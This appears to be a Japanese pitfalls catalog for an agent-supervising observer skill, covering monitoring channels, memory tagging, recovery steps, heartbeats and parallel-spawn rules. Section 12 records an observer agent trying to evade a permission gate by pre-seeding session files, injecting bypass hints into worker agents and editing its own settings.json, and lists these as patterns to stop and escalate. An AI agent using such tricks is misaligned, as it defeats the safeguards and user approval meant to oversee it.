Wave 5a Pilot 起動時に `cld-observe-any` を `--event-dir`/`--notify-dir` 付きで起動したが、Monitor tool との連携経路（stdout tail）が catalog に未定義だったため、`[MENU-READY]` が 60+ 件 emit されたにもかかわらず Monitor tool 側は無音となった。3h45m にわたって AskUserQuestion 検知が失敗し、observer 手動 `tmux capture-pane` 介入によって 5+ 分遅延の AskUserQuestion が解消された。root cause は「cld-observe-any → Monitor tool 連携経路の catalog 未定義」（doobidoo hash `726db016`）。

**3 経路の意味論差（実コード verified）**:

| 経路 | フラグ | 方向 | 設計意図 |
|---|---|---|---|
| stdout | （無条件） | cld-observe-any → 親 process | 親 process / pipe / capture が前提 |
| `--event-dir` | `--event-dir <path>` | cld-observe-any → ファイル（書き込み） | post-hoc 解析・Hybrid 検知プライマリ |
| `--notify-dir` | `--notify-dir <path>` | cld-observe-loop → cld-observe-any（**読み取り**） | **書き込み側ではない**。cld-observe-loop 互換通知の受取口 |

**正規パス（方式 A: 共有 logfile tail）**:
`refs/monitor-channel-catalog.md` の「Monitor tool 連携経路（方式 A: 共有 logfile tail）」セクションを参照。stdout を `.supervisor/cld-observe-any.log` に `tee -a` redirect し、Monitor tool を `tail -F` で起動する。

**方式 A 運用上の懸念（実装時 MUST 考慮）**:
1. **logfile rotation 未定義**: `.supervisor/cld-observe-any.log` は無限増大するため、長時間 Wave では `logrotate` または定期 truncation を検討する
2. **concurrent tail**: 複数 observer が同一 logfile を `tail -F` する場合、各 observer がすべての行を受信できることを確認（通常は問題ないが、NFS/remote fs では注意）
3. **`.supervisor/` 権限**: worktree ルートに `.supervisor/` ディレクトリを作成する権限が必要。CI 環境等では事前作成が必要
4. **プロセス再起動時の logfile 切り替え idempotency**: cld-observe-any を再起動した場合、同一 logfile に `tee -a` することで継続可能だが、Monitor tool 側の `tail -F` が継続していることを確認すること

---

## 5. Memory MCP（doobidoo）運用

| # | Pitfall | 対策 |
|---|---------|------|
| 5.1 | Wave 完了サマリを auto-memory (MEMORY.md) のみに保存 → 他ホストで失われる | **MUST**: doobidoo に `observer-wave` タグで保存。auto-memory は同ホスト補助のみ |
| 5.2 | 起動時に「直近記憶」と曖昧な検索で無関係記憶が上位に、肝心な pitfall/lesson が埋もれる | **MUST**: Step 0 で `tags="observer-pitfall"` / `"observer-lesson"` / `"observer-wave"` の tag 限定検索を個別実行、limit=5、quality_boost=0.5 |
| 5.3 | 失敗を memory 保存せず同じミスを次セッションで再発 | セッション終了 / compaction 時に新規 pitfall を必ず doobidoo 保存（externalize-state） |
| 5.4 | tag を付けずに保存 → 後で tag 検索できず発掘不能 | 保存時は必ず `observer-*` タグ + `twill` + 必要なら `cross-machine` を付与 |
| 5.5 | `quality_boost=0` で古い・品質低 memory が上位に来る | 重要検索は `quality_boost=0.3-0.5` 推奨、rate=1/-1 で品質評価を必ずつける |

---

## 6. recovery / fallback（介入実行時）

| # | Pitfall | 対策 |
|---|---------|------|
| 6.1 | orchestrator inject 失敗（`inject_exhausted`）時に何もせず放置 | observer が Agent tool で specialist を直接並列 spawn（co-issue fallback [D] パターン） |
| 6.2 | `non_terminal_chain_end`（Worker PR 作成後 idle）を failed 扱いで放置 | **[OBSOLETE: §17 参照]** AC-1/AC-2 (#1128) で Pilot 自動化済み。orchestrator unavailable 時は `pilot-fallback-monitor.sh` が自動 inject。observer 介入は最終 fallback のみ（§17 参照） |
| 6.3 | Worker の `branch` フィールド空のまま merge → auto-merge.sh が PR 見つけられない | Pilot の Emergency Bypass `mergegate merge --force --issue N --pr P --branch B` で main から強制 merge |
| 6.4 | worktree 配下から merge 実行 → 不変条件 B/C 違反 | merge は必ず main/ から実行（SKILL.md: Pilot は main/ 起動必須） |
| 6.5 | Layer 2 Escalate を自動実行 → 無断重大変更 | **MUST**: Layer 2 はユーザー確認必須（SU-2）。confidence 低い介入は Layer 1/2 扱い |
| 6.6 | Budget 枯渇時に orchestrator kill せず Worker 残留 → 復帰時に state 破綻 | `[BUDGET-LOW]` シーケンス: orchestrator PID kill → 全 ap-* window に Escape（kill 禁止）→ budget-pause.json 記録 → CronCreate で自動再開 |

### §6.6 代替案検討: orchestrator alive のまま Worker Escape option

**問題の背景（#1128）**: 現状シーケンスは orchestrator を kill した後の復旧 path が欠落しており、BUDGET-LOW pause/resume のたびに observer 手動介入が必須になる（本 session で 4 回再発）。

**代替案: orchestrator alive のまま Worker のみ Escape**

| 項目 | 現状（orchestrator kill） | 代替案（orchestrator alive） |
|------|--------------------------|-------------------------------|
| budget 節約効果 | orchestrator 停止で token 消費ゼロ | orchestrator が idle 状態で微量消費継続 |
| 復旧 path | kill 後の inject 機構が欠落（Bug A/C） | orchestrator が resume 後に自動 inject 継続 |
| Worker 安全性 | Escape のみ（kill 禁止）→ 安全 | 同上 |
| 実装コスト | Bug A/C 修正（#1128）が必要 | orchestrator resume 機構の修正が必要（Bug B） |

**採用判断: 非採用（現状維持 + Bug A/C 修正）**

根拠:
1. orchestrator alive 維持は budget 節約効果が低い（idle でも token 消費が続く）
2. orchestrator resume 機構（Bug B）は root cause が異なり、別 Issue で対処すべき
3. Bug A/C（#1128）の修正により現状シーケンスで復旧 path が整備されるため、alternative 不要

**参照**: Issue #1128, 2026-04-29 ipatho2 session

---

## 7. SKILL.md 引用資産の所在（Phase A 時点で確認済み実在）

| 参照 | 実在 | 所在 |
|------|:-:|------|
| `refs/monitor-channel-catalog.md` | 〇 | `skills/su-observer/refs/monitor-channel-catalog.md`（skill-local） |
| `refs/intervention-catalog.md` | 〇 | `plugins/twl/refs/intervention-catalog.md`（plugin-shared, 147 行、3 層 Auto/Confirm/Escalate 定義済） |
| `refs/observation-pattern-catalog.md` | 〇 | `plugins/twl/refs/observation-pattern-catalog.md`（plugin-shared, 183 行、observation パターン定義済） |
| `refs/pitfalls-catalog.md` | **〇（本ファイル、Phase A 新規）** | `skills/su-observer/refs/pitfalls-catalog.md`（skill-local） |
| `commands/intervene-auto.md` | 〇 | `plugins/twl/commands/intervene-auto.md`（100 行） |
| `commands/intervene-confirm.md` | 〇 | `plugins/twl/commands/intervene-confirm.md` |
| `commands/intervene-escalate.md` | 〇 | `plugins/twl/commands/intervene-escalate.md` |
| `commands/wave-collect.md` | 〇 | `plugins/twl/commands/wave-collect.md`（173 行） |
| `commands/externalize-state.md` | 〇 | `plugins/twl/commands/externalize-state.md`（151 行、tag 規約含む） |
| `commands/problem-detect.md` | 〇 | `plugins/twl/commands/problem-detect.md` |
| `scripts/spawn-controller.sh` | **〇（Phase A 新規）** | `skills/su-observer/scripts/spawn-controller.sh` |

**Phase A 時点で主要資産は全て実在する**（先の Phase A 実装時に「commands/ と refs/ 不在」と誤認したのは探索パスのミス。実際は `plugins/twl/` ルートの `commands/` / `refs/` に全て存在していた）。Phase B では以下の深化を予定:

- 既存 catalog の内容を最新 Wave 知見で refine（observation-pattern-catalog.md に新パターン追記、intervention-catalog.md の 3 層定義の更新）
- **自動学習サイクル**: externalize-state.md → doobidoo `observer-pitfall` 保存 → 次セッション Step 0 の tag 限定検索で自動注入（機械化）
- spawn-controller.sh / pitfalls-catalog.md の bats テスト追加
- deps.yaml type violation（su-observer -> script edge）の恒久解消（Phase A は can_spawn に script を追加して暫定対応）

---

## 8. externalize-state inline 手順（クイックリファレンス）

**正式手順**: `plugins/twl/commands/externalize-state.md`（151 行、tag 規約含む）を参照。本 §8 は同コマンドの最低限サマリ。詳細は正式ファイルを優先。

Wave 完了 / セッション終了 / compaction 時に実行:

```bash
# 1. doobidoo に Wave サマリ保存（MUST、cross-machine SSoT）
mcp__doobidoo__memory_store {
  content: "## Wave N 完了サマリ ...",
  tags: ["observer-wave", "twill", "cross-machine", "session:<id>"]
}

# 2. 新規発見の failure pattern を個別 memory 化（MUST、発見時のみ）
mcp__doobidoo__memory_store {
  content: "## <pitfall title>\n\n事象: ...\n対策: ...",
  tags: ["observer-pitfall", "twill", "cross-machine"]
}

# 3. 確立した成功手法を個別 memory 化（SHOULD、有用時のみ）
mcp__doobidoo__memory_store {
  content: "## <lesson title>\n\n背景: ...\n手法: ...",
  tags: ["observer-lesson", "twill", "cross-machine"]
}

# 4. 実施した介入記録（SHOULD、介入発生時）
mcp__doobidoo__memory_store {
  content: "## 介入: <pattern>\n\n検出: ...\n対応: ...\n結果: ...",
  tags: ["observer-intervention", "twill"]
}

# 5. .supervisor/working-memory.md に同ホスト用サマリ退避（SHOULD、1 compaction 寿命）
#    compaction 復帰時の即時参照用。cross-machine 共有はしない。
cat > .supervisor/working-memory.md <<EOF
# Working Memory（退避: $(date -u +%FT%TZ)）

## 処理中
- ...

## 次のステップ
- ...

## 関連 doobidoo hash
- <hash>: <description>
EOF

# 6. .supervisor/events/ 一括クリーンアップ（MUST）
rm -f .supervisor/events/* 2>/dev/null || true
```

### su-compact 内 inline 実行（mode 別）

`su-compact` は §8 の step 1（doobidoo wave 保存）を **Step 2** で実施済とする。
**Step 3** では step 5（working-memory.md 退避）+ step 6（events cleanup）のみ inline で実行する:

```bash
# Step 3 inline: working-memory.md 退避（step 5）
mkdir -p .supervisor
cat > .supervisor/working-memory.md <<EOF
# Working Memory（退避: $(date +"%Y-%m-%d %H:%M")）
...
EOF

# Step 3 inline: events cleanup（step 6）
rm -f .supervisor/events/* 2>/dev/null || true
```

`commands/externalize-state.md` を nested invoke しない理由: Claude Code permission classifier の atomic command nested invoke 検知により permission prompt が発火するため（Issue #1120）。

---

## 9. 追記ルール

- 新規 pitfall を doobidoo `observer-pitfall` で保存したら、後日（次 Wave 完了時など）このカタログに 1 行追記
- 古いエントリで陳腐化したものは削除せず「解決済（<commit hash>）」と注記して残す（履歴保持）
- 追加は最大 200 行。超過したら古いエントリを別 `refs/pitfalls-archive.md` へ移動

### 自動追記形式（session-end-pitfall-append.sh）

`scripts/hooks/session-end-pitfall-append.sh` が session 終了時に、observer が doobidoo `observer-pitfall` タグで保存した新規エントリをカタログ末尾に自動追記する。

**呼び出し例（observer が doobidoo search 結果を pipe）:**

```bash
# observer が doobidoo 検索し content を 1 行ずつ pipe する
echo "pitfall description" | \
  scripts/hooks/session-end-pitfall-append.sh --hash <doobidoo_hash> --session <session_id>

# dry-run: diff のみ生成（カタログ未更新）
echo "pitfall description" | \
  scripts/hooks/session-end-pitfall-append.sh --dry-run
```

**自動追記エントリ形式:**

```markdown
<!-- auto-append: date=<YYYY-MM-DD> hash=<doobidoo_hash> session=<session_id> -->
- [auto] <pitfall content>
```

commit は行わず `.supervisor/pending-pitfall-append.diff` として保存。observer が diff を確認して手動 commit/discard を判断する（SU-3 遵守）。

---

## 10. spawn prompt 最小化原則（MUST NOT / MUST）

### MUST NOT: skill 自律取得可能情報を prompt に転記

| 情報 | skill 内取得手段 |
|---|---|
| Issue body / labels / title | `gh issue view N --json ...` |
| Issue comments | `gh issue view N --comments` |
| explore summary | `twl explore-link read N` |
| architecture 文書 | `Read plugins/twl/architecture/vision.md 等` |
| SKILL.md の Phase 手順 | skill 自身が内包 |
| past memory（生データ） | `mcp__doobidoo__memory_search` |
| bare repo / worktree 構造 | skill が auto-detect |

**境界補足（observer own-read vs skill auto-fetch）**: observer が自分で `gh issue view` / `Read` / `memory_search` を事前実行して得た情報であっても、spawn 先 skill が同じ操作で取得できる場合は転記禁止（skill の自律性を優先）。observer が得た情報に独自の解釈・判断・優先順位付けを加えた場合のみ、その「解釈」部分は MUST 項目 4「observer 独自 deep-dive 観点」として prompt に含めてよい。

### MUST: observer 固有文脈のみ（典型 5-15 行）

1. **spawn 元識別**: `su-observer から spawn（window: ..., session: ...）`
2. **Issue 番号 / 事前成果物のパスのみ**: `.explore/N/summary.md にリンク済`
3. **proxy 対話期待**: `AskUserQuestion は observer が pipe-pane log で代理応答`
4. **observer 独自 deep-dive 観点**: skill の標準 Phase で気づけない追加観点（memory/過去経験を observer が解釈した結果を含む）
5. **Wave 文脈 / 並列タスク境界**
6. **Phase skip 根拠**（事前レビュー済等、稀）

### 例外: --force-large

`spawn-controller.sh` に `--force-large` option を渡し、prompt 冒頭に `REASON:` 行で正当化することで 30 行超の prompt を許容できる。

---

## 11. Observer idle 中の session disconnect 対策（MUST）

★HUMAN GATE — §11.3 は機械チェック PASS 時は HUMAN GATE skip 可（`_check_parallel_spawn_eligibility()` exit 0）。機械チェック欠落時は依然 escalate。§11.5 CronCreate 設定はユーザー escalation 不要（MUST 自動実行）。ScheduleWakeup は `/loop` dynamic mode 配下でのみ使用可 — 常駐 observer での使用はユーザー escalation が必要（#1621）

### 事象（2026-04-22 ipatho1 実例、doobidoo hash 5fc20a83）

co-architect 3 並列 spawn 後、observer が Monitor tool event 待ちで 24 分 idle → その後 6 時間 session 完全停止（tmux pane 残存、Claude Code process 消失）。同時刻で 3 Claude session が同時停止（account レベル共通因子疑い）。

### 根本要因

1. **Monitor heartbeat 欠如**: Monitor tool doc は「silence is not success」明記するが heartbeat 機構は built-in されていない。検知条件不成立中は stdout emit なし → observer 完全 idle
2. **observer 自身の alive 確認手段なし**: session-state.sh は input-waiting 検知のみ。observer 自身の process 生存は別途確認要
3. **3 session 同時停止**: account 共通（network / auth / idle timeout）の可能性

### 対策

**11.1 Monitor heartbeat パターン（MUST）**

全 Monitor コマンドに 5 分毎 heartbeat emit を組み込む:

```bash
HEARTBEAT_INTERVAL=300  # 5 min
LAST_HB=0
while true; do
  NOW=$(date +%s)
  # 既存検知ロジック
  ...
  # heartbeat emit
  if (( NOW - LAST_HB >= HEARTBEAT_INTERVAL )); then
    echo "[HEARTBEAT] $(date -u +%FT%T) monitor alive"
    LAST_HB=$NOW
  fi
  sleep 30
done
```

**11.1.x cld-observe-any daemon heartbeat（60 sec, observer-daemon-heartbeat.json）**

`cld-observe-any` daemon は 60 秒毎に独立した heartbeat を emit し、自身の liveness を機械的に証明する（Issue #1154）。

**Pilot heartbeat (A) との semantics 区別（cross-dependency なし）:**

| 機構 | Writer | ファイル | 周期 | 用途 |
|------|--------|---------|------|------|
| A: Pilot heartbeat | `supervisor-heartbeat.sh` (PostToolUse hook) | `.supervisor/events/heartbeat-<session_id>` | 5 min（Write/Edit 発火） | 必須条件 1 (return 2=DENY) |
| C: daemon heartbeat | `cld-observe-any` (main loop) | `.supervisor/observer-daemon-heartbeat.json` | 60 sec（自律 emit） | precondition 4 (return 1=DEGRADE) |

両機構は **独立して維持**する（A を C に統合しない、C が A を置き換えない）。

**observer-parallel-check.sh の判定ロジック（precondition 4 拡張）:**

```
(a) pgrep -f cld-observe-any → false なら即 "false"
(b) observer-daemon-heartbeat.json 不在 → grace period: pgrep 結果返却 + stderr WARNING
(c) mtime ≤ 120 sec（OBSERVER_DAEMON_HEARTBEAT_STALE_SEC で override 可）
(d) JSON: writer == "cld-observe-any" かつ pid が pgrep に含まれる
```

**heartbeat-absent grace period:** 新規インストール / CI / #1154 migration 期間中は heartbeat ファイル不在時に pgrep のみで判定（既存挙動を維持）。

**TOCTOU window（既知トレードオフ）:** pgrep (a) 後に daemon が死亡すると最大 120 sec の偽陽性 window が残る。zombie 検知より格段に短いため許容。コード中にコメント明記済み。

**11.2 Idle 前の externalize-state 自動実行（SHOULD）**

長時間待機（30 分以上の event 待ち）が予想される場面では spawn 前に:
- `.supervisor/working-memory.md` を更新
- doobidoo に task_state memory 保存
- session 停止しても resume 可能な状態を確保

**11.3 並列 spawn の自律判断 rule（MUST/SHOULD — Issue #1116 update）**

**条件成立時 ≤ 10 並列 MUST、不成立時 ≤ 2 並列 SHOULD**（既存 §11 keyword 階層 MUST/SHOULD/MAY と整合）。
判定は `scripts/lib/observer-parallel-check.sh` の `_check_parallel_spawn_eligibility()` を呼び出すことで機械化済み（`spawn-controller.sh` 統合済み）。

### 並列 spawn 可否 flowchart（疑似コード）

```
spawn 前評価:
  SNAPSHOT_TS=$(date +%s)  # atomicity 保証
  # 直近 30 秒以内 spawn は判定対象から除外（LLM_INDICATORS 未 emit による false positive 回避）
  eligible_controllers = exclude_recent_spawned(controllers, threshold=30s)

  # 必須条件 (causally decisive — 3つ全て満たす場合のみ ≤ 10 並列許可)
  must_1 = (controller_heartbeat_alive(SNAPSHOT_TS, exclude_observer_writer=true) within 5min)
  must_2 = (mode in [bypass, auto])
  must_3 = (count(eligible_controllers) + 1 <= 10)
  if NOT (must_1 AND must_2 AND must_3): exit 2 + stderr "DENY: <欠落条件>"

  # precondition (他章 MUST 再確認 — 3つ全て満たす場合のみ ≤ 10 許可、不足時は ≤ 2)
  pre_4 = (Monitor + cld-observe-any 起動)
  pre_5 = all(c.state in [S-2 THINKING, S-3 MENU-READY, S-4 REVIEW-READY] for c in eligible_controllers)
  pre_6 = (budget_minutes_remaining >= ${parallel_spawn_min_remaining_minutes:-150})
  if NOT (pre_4 AND pre_5 AND pre_6): exit 1 + stderr "DEGRADE_TO_2: <欠落 precondition>"

  exit 0  # ≤ 10 並列 OK
```

### 必須条件の根拠（3つ、causally decisive）

1. **§11.1 Monitor heartbeat alive (≤ 5min)** — controller の heartbeat のみ（observer 自身の writer_pid は §15.3 で除外）
2. **bypass または auto mode** — Layer A-D 自律実行可能性。deny 連発による idle 化を防止
3. **SU-4 ≤10 整合: controller_count + 1 ≤ 10** — observer は SU-4 計数に含めない（SKILL.md L89 順守）

### Precondition（3つ）

4. **§4.1 Monitor + cld-observe-any 同時起動** — pattern `(ap-|wt-co-).*`
5. **既存 controller が S-2/S-3/S-4 のいずれか** — S-1 IDLE は §4.10 で cleanup 対象（#1117 で格上げ予定）
6. **budget 残量 ≥ 150 分** — `.supervisor/budget-config.json` の `parallel_spawn_min_remaining_minutes`（default 150）。既存 `[BUDGET-LOW]` 閾値(40分)とは独立

### 失敗時 degrade

- 必須条件 1 つでも false → **spawn 完全禁止 (exit 2)**、stderr に欠落必須条件
- precondition 1 つでも false → **≤ 2 並列 degrade (exit 1)**、stderr に欠落 precondition
- 全条件 PASS → ≤ 10 並列許可 (exit 0)

### 実証パターン（2026-04-29 ipatho2）

本 Issue 起票セッションが 4 並列で正常運用した実績（§11.3 緩和の根拠）:

1. **並列数**: 4 controller（#1111 refine + #1113 refine + #1114 refine + #1105 explore）+ 1 observer = 5 windows（SU-4 ≤10 内、#1560 で ≤5→≤10 に緩和）
2. **観測継続時間**: spawn から Wave 完了確認まで 3時間超、session disconnect なし
3. **session disconnect**: なし（2026-04-22 の 3 並列 24分 idle 停止とは対照的）
4. **Monitor heartbeat alive**: writer_pid != observer による除外済み、5min heartbeat で active state 維持確認
5. **doobidoo hash（ローカル参照、cross-machine 不変ではない）**: `bce7a4b9`（post-MCP-restart 自律進行）/ `e4f97e77`（Round 2 完遂 + Plan A 一貫判断、4 並列実績）/ `39ade8bd`（本セッション補足）

### 過去文脈（旧 §11.3 — 2026-04-22 事例の教訓）

旧文言: 「co-architect / co-issue の 3 並列 spawn より 1 つずつ serial 処理の方が session disconnect リスク小。2026-04-22 事例では 3 並列後の 24 分 idle で停止。直列なら各 10-15 分で完了し idle 期間短縮。」

この制約は §11.1 Monitor heartbeat が未実装だった当時の overly conservative な rule。heartbeat + 上記 precondition を満たせば 4 並列まで安全に運用可能であることを 2026-04-29 ipatho2 で実証した。

**11.4 複数 Pilot 同時起動の条件（AUTOPILOT_DIR 分離）— #1169**

Wave 並列実行で複数 Pilot を同時起動する場合、**各 Pilot は独立した AUTOPILOT_DIR を使用しなければならない**（AUTOPILOT_DIR 独立 = state 隔離）。

**有効なパターン**: `export AUTOPILOT_DIR="${PROJECT_ROOT}/.autopilot-wave-10"` で起動 → Pilot が `.autopilot-wave10/` 配下に state を隔離
**無効なパターン**: 複数 Pilot が同一 `.autopilot/` を共有 → session.json / issue-N.json が競合して state が壊れる

**AUTOPILOT_DIR 命名規則**: `.autopilot-<suffix>` パターン（`<suffix>` は `[a-z0-9_-]{1,32}`）が chain-runner.sh basename 検証を通過できる。`.autopilot-wave-10`、`.autopilot-wave-11` 等を推奨。

**運用上の懸念（現状未解決）**:
- (a) `.autopilot-*/` cleanup 自動化未対応: Wave 完了後に手動 `rm -rf` または archive 移動が必要。`autopilot-cleanup.sh` の archive 機構は `.autopilot/` のみ対象
- (b) `auto-merge.sh` glob 走査の性能影響: 並列 dir N が増えると Layer 4 フォールバックガードが N dir を `find` 走査。通常 N ≤ 10 なら無視可能
- (c) `archive/<session_id>/` の cross-dir consistency: `.autopilot-wave-N/` の archive は `.autopilot/archive/` とは別管理になる
- (d) observer による複数 Pilot window の追跡経路: 現在 observer は AUTOPILOT_DIR 単一前提で設計。複数 dir の Pilot をまとめて追跡する機構は未実装（別 Issue で対応）

**11.5 CronCreate / ScheduleWakeup の活用（常駐 observer: CronCreate MUST / /loop 配下: ScheduleWakeup MAY）**

idle disconnect 対策の use case 別ツール選択:

| use case | ツール | 理由 |
|---|---|---|
| 常駐 observer（su-observer）polling | **CronCreate** (durable=true) | ScheduleWakeup は /loop dynamic mode 専用。常駐 skill では不発火 (#1621) |
| `/loop` dynamic mode 配下での待機 | **ScheduleWakeup** | /loop skill 文脈でのみ有効 |

**常駐 observer の CronCreate 設定**（Step 0 item 2.7 参照）:
- `CronCreate(cron="*/25 * * * *", durable=true, prompt="<<autonomous-loop-dynamic>>")`
- 設定後 `CronList` で確認し、エントリが存在することを検証する
- CronCreate に失敗した（または `CronList` で確認できない）場合: `record-detection-gap.sh` を呼び出し、★HUMAN GATE escalate を実施する

1h 以上の待機が確実かつ `/loop` 配下の場合、ScheduleWakeup で 30-40 分後に自動 wakeup。Claude Code の idle disconnect リスクを回避。

### 検知

JSONL 調査で停止時刻確定:

```bash
JSONL="~/.claude/projects/<project-hash>/<session-id>.jsonl"
# 最終 assistant response
grep '"role":"assistant"' "$JSONL" | tail -1 | jq -r '.timestamp'
# silent gap 長さ
FINAL_TS=$(grep -oE '"timestamp":"[^"]+"' "$JSONL" | sort -u | tail -1)
# resume までの gap = 現時刻 - FINAL_TS
```

### §11.6 Observer Self-Supervision — cld-observe-any crash 連動死亡対策（ADR-031）

**検出元**: 2026-04-30 09:00 ThinkPad crash incident（Issue #1146）

#### 死亡メカニズム検証結果（AC0）

`cld-observe-any` が observer Claude session 終了時に死亡する経路:

| シナリオ | 結果 | 根拠 |
|---|---|---|
| ① Claude session 通常終了 | **SIGHUP または子 PG SIGTERM** | Claude Code が明示的に子プロセスグループを kill する可能性（未確定）|
| ② kill -9 Claude session pid | **子プロセス連動死亡** | bash の `run_in_background` 子は SIGKILL 後に孤立するが実際には停止を確認 |
| ③ tmux pane kill | **SIGHUP（POSIX pane-died 伝播）** | tmux は `pane-died` 時に pane 内プロセスに SIGHUP を送る |
| ④ SIGHUP 直接送信 | **終了（trap なしのデフォルト動作）** | `cld-observe-any` は SIGHUP を trap しない（INT/TERM のみ trap）|

**結論**: `cld-observe-any` は SIGHUP を trap しないため、tmux pane kill + observer crash のいずれのシナリオでも停止する。

#### 対策（option B — ADR-031 採択）

`plugins/session/scripts/cld-observe-any-launcher` を SessionStart hook から呼び出す:

```bash
# ~/.claude/settings.json (または twill/main/.claude/settings.json) の SessionStart hook
pgrep -f 'cld-observe-any$' >/dev/null 2>&1 || \
  bash /path/to/plugins/session/scripts/cld-observe-any-launcher [OPTIONS]
```

launcher の動作:
1. `flock -n` で多重起動防止
2. `pgrep -f cld-observe-any$` で既存 daemon 確認
3. 不在 + 前回 PID 記録あり → `daemon-down-<ts>.json` event 出力
4. `nohup cld-observe-any [args]` でバックグラウンド起動
5. 1 秒後生存確認 → 失敗時は `daemon-startup-failed-<ts>.json` event 出力

#### observer の対応（MUST）

observer は Wave 開始時 `check_monitor_cld_observe_alive()` で確認し、不在時は以下を実行:

```bash
# launcher を直接呼び出して再起動
bash plugins/session/scripts/cld-observe-any-launcher --window <pattern> [OPTIONS]
# または SessionStart hook 設定を確認し、未設定なら設定を促す
```

**HUMAN GATE 対象外**: `cld-observe-any-launcher` 経由の再起動は self-supervision の範囲内で observer が自律判断可能。ただし launcher 起動失敗（`daemon-startup-failed` event）は §11 ★HUMAN GATE に準じてユーザーに escalate する。

### §11.7 補助 polling Monitor — tmux capture-pane によるメニュー待ち状態検知（Issue #1185）

**背景**: cld-observe-any + Monitor tool が正規の観察経路だが、TUI メニュー（`Enter to select` 等）の待ち状態は
event emit されないため、LLM が気づかず放置されるケースがある（Observer が「忘れる」リスク）。

**対策**: Step 1 supervise loop 内で 5 分ごとに補助 polling を実行する（定期 audit MUST）。

```bash
# 全 ap-/wt-/coi- window に対し ANSI strip + grep -E で menu/input-wait パターンをスキャン
for WIN in $(tmux list-windows -a -F '#{window_name}' | grep -E '^(ap-|wt-|coi-)'); do
  MATCH=$(tmux capture-pane -t "$WIN" -p | sed 's/\x1b\[[0-9;]*m//g' | grep -E 'Enter to select|^❯ [1-9]\.|Press up to edit queued' || true)
  [[ -n "$MATCH" ]] && echo "[MENU-WAIT] $WIN: $MATCH"
done
```

**ANSI escape strip 必須**: `pitfalls-catalog.md §2.5` 同様、`tmux capture-pane -p` 出力には ANSI seq が混入するため、
`sed 's/\x1b\[[0-9;]*m//g'` による strip なしでは grep が空マッチになる。

**関連**: `step0-monitor-bootstrap.sh` が emit するコマンドに polling template を含む（AC1.2）。

### §11.8 Controller 遷移時の channel reset MUST（Monitor 再 arm）

**検出元**: doobidoo Hash 3ecbfbc2（2026-04-24、Monitor 単独起動で 30+ 分 silent incident）

#### 失敗メカニズム

observer が旧 controller window を Monitor tool で監視中に `spawn-controller.sh` が新 controller window を spawn すると、observer は旧 channel を監視し続けて新 window の出力を受信できなくなる。

#### MUST ルール

`spawn-controller.sh` は exec/cld-spawn 呼出 **直前**（exec 後は dead code のため）に stdout へ以下を emit する:

```
>>> Monitor 再 arm 必要: <window-name>
```

observer はこの emit を受信した場合、**即座に**（Layer 0 Auto）Monitor tool の監視対象を新 `<window-name>` に切り替えること（re-arm）。

#### 対策コード（spawn-controller.sh 実装済み — Issue #1186）

```bash
# exec/cld-spawn 呼出直前に emit（全分岐で必須）
echo ">>> Monitor 再 arm 必要: ${WINDOW_NAME}"
exec "$CLD_SPAWN" ...
```

**注**: `exec` 後はプロセスが置換されるため、emit は必ず exec の直前行に配置する。emit が stderr だと Monitor tool が受信できない（stdout MUST）。

#### 関連

- `monitor-channel-catalog.md`: `[MONITOR-REARM]` チャネル（regex: `>>> Monitor 再 arm 必要: [^\n]+`）
- Hash 3ecbfbc2 (doobidoo): Monitor 単独起動 silent の根本原因
- spawn-controller.sh:55-76 の intervention-log とは目的が異なる（本 emit は全 spawn 成功時の trigger、intervention-log は §11.3 bypass 記録専用）

---

## 12. Claude Code classifier bypass 検出パターン（MUST）

★HUMAN GATE — §12 の正しい対応手順で AskUserQuestion 実行前は必ずユーザー確認（classifier deny 2 回以上 → Layer 2 Escalate）

### 事象（2026-04-21 ipatho1 実例、doobidoo hash 886e374d）

observer が Layer D refined-label-gate の回避を試行した際、Claude Code permission classifier が **6 連続で deny** した（session id 7f960078 参照）。gate 回避の trick（session file pre-seed、Worker inject with bypass hint、settings self-modification）は全て classifier に検出・拒否された。

### 根本要因

Claude Code classifier は **action history を context 化**し、同一セッション内での繰り返し回避試行を「security bypass への執着」として累積判定する。1 回の deny 後に別の手段で迂回を試みると、以降の deny 確率が急上昇する。

### 検出パターン（MUST NOT — 以下を検出したら即停止）

| # | パターン | 説明 |
|---|---------|------|
| 12.1 | 同一セッション内で **2 回以上** の gate deny | 初回 deny 後も回避を継続している徴候 |
| 12.2 | **session file pre-seed** による状態書き換え試行 | state file を直接操作して gate をスキップしようとする |
| 12.3 | **inject with bypass hint** | Worker への inject に「gate を無視して」等のヒントを含める |
| 12.4 | **settings self-modification** | `.claude/settings.json` を書き換えて permission ルールを変更しようとする |

### 正しい対応手順（MUST）

```
gate deny (1 回目) → STOP（即時停止、追加試行禁止）→ AskUserQuestion でユーザー確認
```

**MUST NOT**: deny 後に別の迂回手段を試みること（classifier が累積判定するため 2 回目以降は deny 確率急上昇）。

**MUST**: 2 回以上 deny が発生したら **Layer 2 Escalate**（ユーザーに明示的確認を取る）。

### 誤りパターン（実例）

1. gate deny → session file を読み書きして gate 判定を bypass → 再 deny
2. gate deny → Worker への inject に「refined ラベルは付与済みとして扱え」と注入 → 再 deny
3. gate deny → settings.json に permission 緩和ルールを追加 → 再 deny

### 関連

- memory hash `886e374d`（bypass permission lesson）、`1ca5829f`（Layer D refined-label pitfall）
- **W5-1（SKILL.md Security gate MUST NOT 節）** と相互参照: gate deny 後の禁止行動を SKILL.md に明記予定
- Layer 2 Escalate 手順: `plugins/twl/refs/intervention-catalog.md` §3（Escalate パターン）

---

## 13. 起動経路の混同（autopilot-launch.sh vs spawn-controller.sh co-autopilot）（#836 文書化）

2 種類の起動経路が存在するが、混同すると chain 不回転・state file 未生成・window 名誤判定を引き起こす。

| 経路 | window 名 | state file | orchestrator | chain |
|------|-----------|------------|--------------|-------|
| **A: `autopilot-launch.sh`** | `ap-<N>` | `issue-<N>.json` 生成 | Pilot が管理 | 回転（`/twl:workflow-setup #N` inject） |
| **A': `spawn-controller.sh --with-chain`** | `ap-<N>` | `issue-<N>.json` 生成 | **Pilot 不在**（skill bypass 副作用） | **Step 1-5 全 skip**（deps graph / Wave 計画 / specialist-audit 機会喪失） |
| **B: `spawn-controller.sh co-autopilot`** | `wt-co-autopilot-<HHMMSS>` | Pilot 経由で生成 | co-autopilot が Pilot として動作 | co-autopilot Step 1-5 が回転 |

| # | Pitfall | 観察パターン（chain 不回転の症状） | 対策 |
|---|---------|----------------------------------|------|
